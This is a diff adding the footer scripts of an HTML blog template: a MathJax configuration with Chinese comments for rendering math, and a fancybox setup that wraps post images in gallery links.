+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
